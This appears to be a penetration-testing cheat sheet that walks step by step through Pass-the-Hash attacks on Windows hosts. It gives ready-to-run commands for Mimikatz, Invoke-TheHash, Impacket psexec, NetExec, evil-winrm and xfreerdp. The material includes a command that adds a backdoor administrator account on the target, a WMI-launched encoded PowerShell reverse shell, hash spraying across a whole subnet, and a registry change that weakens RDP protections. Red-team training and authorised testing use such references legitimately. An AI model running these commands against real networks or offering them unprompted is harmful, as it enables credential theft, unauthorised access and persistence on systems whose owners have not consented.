1. Acquire NTLM hash through administrative access on a source machine.
2. Identify available protocols on target: **SMB** (445), **WMI** (135), **WinRM** (5985/5986), or **RDP** (3389).
3. Determine account type. **Domain accounts** bypass most local UAC restrictions; **local accounts** are restricted to the **RID-500** account unless registry modifications exist.
4. Execute based on platform:
    - Windows: Use **Mimikatz** for local token impersonation or **Invoke-TheHash** for remote WMI/SMB execution.
    - Linux: Use **Impacket** for single-target SYSTEM shells, **NetExec** for subnet spraying, **evil-winrm** for PowerShell remoting, or **xfreerdp** for GUI access.

---

## Pass the Hash with Mimikatz

NTLM hash is available and a local process needs to be spawned with the user's identity to access network resources like shares.

Spawn a command prompt under the user context using the NTLM hash

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USERNAME> /rc4:<HASH> /domain:<DOMAIN> /run:cmd.exe" exit
```

- **Dangerous / misconfigured settings**
    
    - **SeDebugPrivilege** must be available to the current user to interact with the LSA process.
- **Gotchas**
    
    - **Mimikatz** will fail if **LSA Protection** is enabled or if the user lacks **local administrative privileges**.

> ⚠️ Gap: Mimikatz `sekurlsa::pth` requires **administrative privileges** on the local attacking machine to perform the `privilege::debug` command and patch memory.

## Pass the Hash with Invoke-TheHash (SMB)

Remote command execution is required from a Windows host where the attacker lacks local admin rights but the target account has admin rights on the remote system.

Create a new local user on the target via SMB

```
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <HASH> -Command "net user <USERNAME> <PASSWORD> /add && net localgroup administrators <USERNAME> /add" -Verbose
```

- **Tool comparison**
    
    - Invoke-SMBExec → `Invoke-SMBExec` → Prefer when **SMB (445)** is open and **Service Control Manager** access is confirmed.
    - Invoke-WMIExec → `Invoke-WMIExec` → Prefer when **WMI (135)** is open to avoid service creation artifacts.
- **Gotchas**
    
    - **Access Denied** occurs if the user lacks **Service Control Manager** write privileges on the target.

## Pass the Hash with Invoke-TheHash (WMI)

Remote command execution or reverse shell via WMI is needed from a Windows host.

Execute a Base64 encoded PowerShell reverse shell via WMI

```
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <HASH> -Command "powershell -e <HASH>"
```

- **Edge cases**
    - Use a machine name instead of an IP for the `-Target` parameter if DNS resolution is functional.

## Pass the Hash with Impacket PsExec

A SYSTEM shell is required from a Linux attack host and **SMB** is reachable.

Gain a SYSTEM-level interactive shell

```
impacket-psexec <USERNAME>@<TARGET_IP> -hashes :<HASH>
```

- **Gotchas**
    - Execution fails if **ADMIN$** share is not writable.

## Pass the Hash with NetExec

A local administrator hash was dumped from one machine and needs to be tested for reuse across a subnet.

Spray a hash across a subnet to find administrative access

```
netexec smb <TARGET_IP>/24 -u <USERNAME> -d <DOMAIN> -H <HASH>
```

Check for local administrator rights specifically using local authentication

```
netexec smb <TARGET_IP> -u <USERNAME> -d . -H <HASH> --local-auth
```

Execute a command on a target where the account is confirmed as an administrator

```
netexec smb <TARGET_IP> -u <USERNAME> -d . -H <HASH> -x <SERVICE_NAME>
```

- **Dangerous / misconfigured settings**
    
    - **Account Lockout Policy** may trigger on domain accounts; use `--local-auth` to mitigate risk when targeting local accounts.
- **Gotchas**
    
    - **Pwn3d!** label only appears if the user has **administrative rights** on the target.

## Pass the Hash with evil-winrm

Access is required from Linux and **SMB** is blocked or **WinRM** is the preferred lateral movement path.

Connect to a remote PowerShell session

```
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <HASH>
```

- **Edge cases**
    - When using domain accounts, the format must be `<USERNAME>@<DOMAIN>`.

## Pass the Hash with xfreerdp

GUI access is required from a Linux host.

Authenticate to RDP using an NTLM hash

```
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<HASH>
```

- **Dangerous / misconfigured settings**
    - **DisableRestrictedAdmin** registry key must be set to 0.

Enable Restricted Admin Mode on target to allow PtH

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

- **Gotchas**
    - **Account restrictions** error occurs if **Restricted Admin Mode** is disabled.

## UAC and Registry Restrictions

Local accounts (non-RID 500) are used for remote administration via PtH.

- **Dangerous / misconfigured settings**
    
    - **LocalAccountTokenFilterPolicy**: If set to 0, only the built-in **RID-500** Administrator account can perform remote PtH.
    - **FilterAdministratorToken**: If set to 1, even the **RID-500** account is subject to UAC and remote PtH will fail.
- **Gotchas**
    
    - **Remote PTH will fail** against local accounts if UAC protection is active and the account is not RID-500.